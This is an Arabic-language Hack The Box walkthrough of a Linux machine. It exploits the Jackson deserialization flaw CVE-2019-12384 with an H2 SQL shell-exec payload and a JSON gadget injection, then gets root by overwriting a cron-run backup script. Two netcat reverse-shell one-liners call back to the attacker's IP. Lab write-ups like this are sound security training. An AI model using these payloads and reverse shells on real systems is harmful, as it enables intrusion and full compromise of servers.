

 ![Desktop View](/img/tm/0.png)


Created by fasto

My profile : https://www.hackthebox.eu/home/users/profile/

_Sammmry:_


 web application   بعد فحص 

  cve 2019-12384 نجد ان السيرفر مصاب ب 

بعد ذلك نجد user نقوم باستغلالها للحصول على 

root نضع داخله الشال الخاص بنا لنحصل على صلاحيات backup.sh


- sammmry
- 1 Recon
   - 1.1 Nmap
   - 1.2 Port
   - 1.3 CVE- 201-12384
- 2 User
- 3 privilege escalation
   - 3.1 backup.sh


## 1 Recon

### 1.1 Nmap

nmap نبدا بفحص البورتات باستخدام

 ![Desktop View](/img/tm/1.png)

  نجد بورت 80 مفتوح

### 1.2 Port

 نفتح


http://10.10.10.214
```
Validation failed: Unhandled Java exception:
com.fasterxml.jackson.core.JsonParseException:
Unrecognized token 'test':

```
 في جوجل نجد نجد ان fasterxml.jackson نبحث عن

CVE- 2019 - 12384 السيرفر مصاب ب

```
```
fasterxml.jackson


### 1.3 CVE-2019-12384

https://github.com/jas502n/CVE-2019-12384


في ملف في جهازنا payload نقوم بوضع

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws
java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new
java.util.Scanner(Runtime.getRuntime().exec(command).getInputSt
ream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.10.14.212 5555 >/tmp/f')
```




python serverنشغل


 ![Desktop View](/img/tm/2.png)

  ![Desktop View](/img/tm/3.png)


#### نفتح

http://10.10.10.214



نقوم بحقن
```
["ch.qos.logback.core.db.DriverManagerConnection
Source",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTE
M_OUT=3;INIT=RUNSCRIPT FROM
'http://I10.10.14.212/payload'"}]

```
  ![Desktop View](/img/tm/4.png)

  ![Desktop View](/img/tm/5.png)

## 2 User

linpeas

على السيرفرlinpeas نرفع shell بعد الحصول على


  ![Desktop View](/img/tm/6.png)

## 3 privilege escalation

### 3.1 backup.sh

الملف linpead  نجد بالفحص ب

/usr/bin/timer_backup.sh

 نقوم بالتعديل عليه بالامر  الاتي   نضع داخل الملف


خاص بنا shell 


 
نحصل على شال timer_backup.shبتشغيل cron عندما يقوم

rootبصلاحيات


```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.10.14.212 1234 >/tmp/f"
>/usr/bin/timer_backup.sh
```



  ![Desktop View](/img/tm/7.png)



